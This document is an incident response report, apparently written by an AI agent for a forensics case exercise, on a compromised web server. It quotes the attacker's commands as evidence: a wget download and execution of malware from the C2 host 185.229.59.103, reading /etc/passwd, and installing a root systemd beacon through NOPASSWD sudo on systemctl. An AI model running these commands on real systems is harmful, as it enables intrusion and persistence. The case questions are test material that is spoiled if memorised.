All 9 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised. An attacker gained command execution as `www-data` (likely via web application exploitation), downloaded and executed malware from C2 server `185.229.59.103`, then pivoted to the `deploy` account via SSH. Using deploy's overly permissive NOPASSWD sudo access to `systemctl`, the attacker installed a persistent C2 beacon as a systemd service running as root. The attacker also performed anti-forensics by clearing deploy's shell history.

## Attack Timeline

| Time (Apr 2026) | Event | Source |
|---|---|---|
| **Unknown** | Attacker gains command execution as `www-data`, runs recon (`id`, `uname -a`), downloads malware from `http://185.229.59.103/u` to `/tmp/.u`, executes it, reads `/etc/passwd` | `fs/var/www/.bash_history` |
| **Apr 14, 03:17:44** | Attacker logs into `deploy` via SSH publickey from `185.229.59.103` | `auth.log:30` |
| **Apr 14, 03:18:02** | `sudo cat /etc/passwd` — credential/config reconnaissance | `auth.log:32` |
| **Apr 14, 03:18:12** | `sudo cp /tmp/update /usr/local/bin/update` — staged a binary | `auth.log:35` |
| **Apr 14, 03:18:17** | `sudo chmod +x /usr/local/bin/update` | `auth.log:36` |
| **Apr 14, 03:18:29** | `sudo tee /etc/systemd/system/system-updater.service` — created malicious systemd unit | `auth.log:37` |
| **Apr 14, 03:18:44** | `sudo systemctl daemon-reload` | `auth.log:38` |
| **Apr 14, 03:18:58** | `sudo systemctl enable system-updater.service` — persistence enabled | `auth.log:39` |
| **Apr 14, 03:19:03** | `sudo systemctl start system-updater.service` — beacon activated | `auth.log:40` |
| **Apr 14, 03:20:51** | Attacker SSH session closed | `auth.log:41` |

## Key Findings

### 1. Malicious Persistence (CONFIRMED)
A systemd unit `system-updater.service` was installed that runs as root and beacons to `https://185.229.59.103:8443/beacon` every 600 seconds, exfiltrating the hostname and IP address. This service was enabled and started during the attacker session.

### 2. www-data Shell History Shows Attacker Activity (CONFIRMED)
The file `fs/var/www/.bash_history` (the www-data account's history) contains 7 commands showing clear post-exploitation: system recon, malware download from the C2, execution of a hidden payload (`/tmp/.u`), and reading `/etc/passwd`.

### 3. Deploy Account Compromise (CONFIRMED)
The `deploy` account was accessed from the C2 IP `185.229.59.103` via SSH publickey authentication on Apr 14 at 03:17:44. No failed logins preceded it — the attacker had a valid key.

### 4. Anti-Forensics — History Tampering (INFERENCE)
Deploy's `.bash_history` contains only 15 benign CI/CD commands and none of the 9 malicious sudo commands recorded in auth.log. The attacker likely cleared or suppressed shell history recording.

### 5. Dangerous Sudoers Configuration (CONFIRMED)
The deploy account has `NOPASSWD` sudo access to bare `/usr/bin/systemctl`, allowing installation and execution of arbitrary systemd services as root. This was the privilege escalation vector.

### 6. C2 IP — 185.229.59.103 (CONFIRMED)
Identified as a C2 server (high confidence). Used both for malware hosting (HTTP on port 80) and beacon collection (HTTPS on port 8443).

## Indicators of Compromise

| Type | Value | Context |
|---|---|---|
| IP | `185.229.59.103` | C2 server — SSH login source, malware host, beacon destination |
| URL | `http://185.229.59.103/u` | Malware download URL |
| URL | `https://185.229.59.103:8443/beacon` | C2 beacon endpoint |
| File | `/tmp/.u` | Downloaded malware (hidden dot-file in /tmp) |
| File | `/usr/local/bin/update` | Staged binary copied from `/tmp/update` |
| File | `/etc/systemd/system/system-updater.service` | Malicious persistence unit |

## Case Questions

**Case Q1:** Shell histories were analyzed for the following accounts: **root** (4 commands, benign admin activity), **deploy** (15 commands, normal CI/CD activity only), **alice** (6 commands, benign log-review activity), and **www-data** (`/var/www/.bash_history`, 7 commands, highly suspicious attacker activity). **Bob** had no `.bash_history` file present in the evidence despite having a valid login shell and two SSH sessions in the auth log.

**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) shows what the attacker did: they ran system reconnaissance (`id`, `uname -a`), downloaded malware from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), made it executable (`chmod +x /tmp/.u`), ran it in the background (`/tmp/.u &`), and read the system's password file (`cat /etc/passwd`). Additionally, while **deploy's** `.bash_history` does not contain the attacker's commands (evidence of history tampering), the **auth.log** sudo records (lines 32–40) fully document the attacker's actions during the deploy session: reading `/etc/passwd`, staging a binary, and installing/enabling/starting the malicious `system-updater.service` persistence mechanism.